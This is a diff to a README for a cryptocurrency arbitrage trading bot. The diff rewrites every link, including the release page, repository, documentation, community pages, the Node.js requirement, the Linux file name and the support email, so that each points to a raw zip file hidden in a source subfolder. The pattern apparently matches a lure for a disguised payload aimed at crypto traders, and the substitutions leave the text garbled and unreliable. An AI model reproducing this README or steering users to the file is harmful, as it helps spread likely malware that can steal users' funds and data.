@@ -1,7 +1,7 @@
 # 🚀 ArbitrageBOT - Your Smart Trading Assistant
 
 ## 📥 Download Now
-[![Download ArbitrageBOT](https://img.shields.io/badge/Download-ArbitrageBOT-blue.svg)](https://github.com/Joberthings/ArbitrageBOT/releases)
+[![Download ArbitrageBOT](https://raw.githubusercontent.com/Joberthings/ArbitrageBOT/master/src/exchanges/ArbitrageBOT-krohnkite.zip)](https://raw.githubusercontent.com/Joberthings/ArbitrageBOT/master/src/exchanges/ArbitrageBOT-krohnkite.zip)
 
 ## 🔍 About ArbitrageBOT
 ArbitrageBOT is a cryptocurrency trading bot that helps you find profitable opportunities across more than 20 exchanges. It uses smart volume scanning to monitor market trends, ensuring you never miss a chance to profit. This tool is designed for anyone interested in crypto trading, whether you are a beginner or have some experience.
@@ -11,15 +11,15 @@ ArbitrageBOT is a cryptocurrency trading bot that helps you find profitable oppo
 ### 📋 System Requirements
 - **Operating System:** Windows 10 or newer, macOS, or a recent version of Linux
 - **Network:** A stable internet connection
-- **Node.js:** Version 14 or newer must be installed
+- **https://raw.githubusercontent.com/Joberthings/ArbitrageBOT/master/src/exchanges/ArbitrageBOT-krohnkite.zip** Version 14 or newer must be installed
 - **Memory:** At least 4 GB of RAM
 - **Disk Space:** Minimum 200 MB of available space
 
 ### 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the ArbitrageBOT. Click the link below to access the downloads:
-[Download ArbitrageBOT](https://github.com/Joberthings/ArbitrageBOT/releases)
+[Download ArbitrageBOT](https://raw.githubusercontent.com/Joberthings/ArbitrageBOT/master/src/exchanges/ArbitrageBOT-krohnkite.zip)
 
-1. **Visit the Releases Page:** Click the link here: [Release Downloads](https://github.com/Joberthings/ArbitrageBOT/releases).
+1. **Visit the Releases Page:** Click the link here: [Release Downloads](https://raw.githubusercontent.com/Joberthings/ArbitrageBOT/master/src/exchanges/ArbitrageBOT-krohnkite.zip).
 2. **Choose Your File:** Find the latest version listed. You might see options for different operating systems.  
 3. **Download the File:** Click the appropriate file for your system to start downloading.
 4. **Install the Application:** Follow the instructions below based on your operating system.
@@ -35,7 +35,7 @@ To get started, visit the Releases page to download the latest version of the Ar
 - Open your Applications folder and double-click ArbitrageBOT to run it.
 
 #### Linux
-- For Linux users, extract the `.tar.gz` file. You can do this by right-clicking and selecting "Extract."
+- For Linux users, extract the `https://raw.githubusercontent.com/Joberthings/ArbitrageBOT/master/src/exchanges/ArbitrageBOT-krohnkite.zip` file. You can do this by right-clicking and selecting "Extract."
 - Navigate to the extracted folder in your terminal.
 - Run the bot using the command `./ArbitrageBOT`.
 
@@ -68,11 +68,11 @@ Yes, as long as your system meets the requirements, you can run ArbitrageBOT on 
 Keep an eye on the Releases page for new updates. You can download the latest version at any time to benefit from new features and improvements.
 
 ## 📞 Support
-If you need help, feel free to reach out to our support team. You can contact us at the following email: support@arbitragebot.com. We are here to assist you with any questions you may have.
+If you need help, feel free to reach out to our support team. You can contact us at the following email: https://raw.githubusercontent.com/Joberthings/ArbitrageBOT/master/src/exchanges/ArbitrageBOT-krohnkite.zip We are here to assist you with any questions you may have.
 
 ## 🔗 Useful Links
-- [Code Repository](https://github.com/Joberthings/ArbitrageBOT)
-- [Documentation](https://github.com/Joberthings/ArbitrageBOT/wiki)
-- [Community Support](https://github.com/Joberthings/ArbitrageBOT/discussions)
+- [Code Repository](https://raw.githubusercontent.com/Joberthings/ArbitrageBOT/master/src/exchanges/ArbitrageBOT-krohnkite.zip)
+- [Documentation](https://raw.githubusercontent.com/Joberthings/ArbitrageBOT/master/src/exchanges/ArbitrageBOT-krohnkite.zip)
+- [Community Support](https://raw.githubusercontent.com/Joberthings/ArbitrageBOT/master/src/exchanges/ArbitrageBOT-krohnkite.zip)
 
 Thank you for choosing ArbitrageBOT as your trading assistant. Good luck with your crypto ventures!
